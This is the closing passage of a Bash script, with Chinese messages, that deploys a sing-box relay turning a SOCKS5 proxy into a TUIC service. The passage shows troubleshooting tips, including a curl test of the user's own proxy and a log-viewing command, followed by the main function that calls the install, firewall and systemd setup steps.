    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════════════════${NC}\n"
    
    # 故障排除提示
    echo -e "${WHITE}${BOLD}🛠️ 故障排除提示：${NC}"
    echo -e "  ${CYAN}1. 如果连接失败，请检查：${NC}"
    echo -e "     - 防火墙是否正确开放端口 $RELAY_PORT"
    echo -e "     - SOCKS5 源服务器是否正常工作"
    echo -e "     - 网络连接是否稳定"
    echo -e "  ${CYAN}2. 测试SOCKS5源连接：${NC}"
    echo -e "     curl --socks5-hostname $TARGET_USERNAME:$TARGET_PASSWORD@$TARGET_IP:$TARGET_PORT http://httpbin.org/ip"
    echo -e "  ${CYAN}3. 查看详细日志：${NC}"
    echo -e "     journalctl -u sing-box -f --no-pager"
    echo ""
}

# 主函数
main() {
    show_banner
    
    check_root
    detect_system
    install_dependencies
    read_and_fix_socks5_config
    detect_architecture
    download_singbox
    detect_ip_addresses
    generate_relay_config
    configure_firewall
    generate_singbox_config
    create_systemd_service
    start_singbox_service
    save_config_json
    show_config_summary
    
    echo -e "${GREEN}${BOLD}🎊 SOCKS5 → TUIC 自动中转部署完成！${NC}"
    echo -e "${WHITE}完整配置信息保存在: ${YELLOW}/opt/tuic_relay_config.json${NC}"
    echo -e "${WHITE}如有问题，请查看上方的故障排除提示${NC}\n"
}

# 错误处理
set -euo pipefail
trap 'log_error "脚本执行出错，行号: $LINENO"' ERR

# 执行主函数
main "$@"